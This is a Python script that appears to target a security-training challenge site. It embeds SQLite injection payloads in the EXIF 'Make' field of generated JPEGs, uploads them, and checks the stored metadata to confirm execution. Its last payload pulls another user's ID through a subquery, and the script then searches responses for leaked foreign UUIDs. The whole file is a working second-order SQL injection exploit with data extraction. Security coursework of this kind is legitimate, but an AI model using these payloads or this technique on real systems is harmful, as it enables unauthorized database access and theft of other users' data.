# run_all_payloads.py — build 4 calibrated EXIF-SQLi test images (pure Python, no exiftool),
# upload each, and print the stored 'make' so we can see which payload executes.
import requests, base64, json, re, piexif
from PIL import Image

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
base_img = Image.open("paisaje.png").convert("RGB")

def build(make_payload: str) -> str:
    base_img.save("inj.jpg", "jpeg", quality=88)
    def dms(dec):
        d=int(dec); m=int((dec-d)*60); s=round((dec-d-m/60)*3600,4)
        return ((d,1),(m,1),(int(s*100),100))
    exif = {
        "0th": {piexif.ImageIFD.Make: make_payload.encode("ascii","ignore"),
                piexif.ImageIFD.Model: b"Galaxy S25"},
        "Exif": {piexif.ExifIFD.DateTimeOriginal: b"2025:10:01 23:51:37"},
        "GPS": {piexif.GPSIFD.GPSLatitudeRef:b"S", piexif.GPSIFD.GPSLatitude:dms(41.13),
                piexif.GPSIFD.GPSLongitudeRef:b"W", piexif.GPSIFD.GPSLongitude:dms(71.31)},
    }
    piexif.insert(piexif.dump(exif), "inj.jpg")
    return "data:image/jpeg;base64," + base64.b64encode(open("inj.jpg","rb").read()).decode()

tests = [
    ("A_literal",  "HELLO"),
    ("B_concat",   "A'||'B"),
    ("C_version",  "'||(SELECT sqlite_version())||'"),
    ("D_leak_id1", "'||(SELECT user_id FROM images WHERE id=1)||'"),
]
for label, payload in tests:
    uri = build(payload)
    r = requests.post(f"{BASE}/upload", json={"image": uri, "description": label, "user_id": UID})
    print(f"upload {label:12} payload={payload!r:45} -> {r.status_code}")

print("\n--- stored 'make' per test ---")
data = requests.get(f"{BASE}/images/{UID}").json()
labels = {t[0] for t in tests}
for img in sorted(data, key=lambda x: x["id"]):
    if img.get("description") in labels:
        print(f"{img['description']:12} id={img['id']:3} make={img.get('make')!r}")

print("\n--- leaked foreign UUID in make/model/datetime ---")
for img in data:
    for field in ("make","model","datetime"):
        v = str(img.get(field,""))
        m = re.search(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", v)
        if m and m.group(0) != UID:
            print(f"  LEAKED in {field} of id={img['id']}: {m.group(0)}")
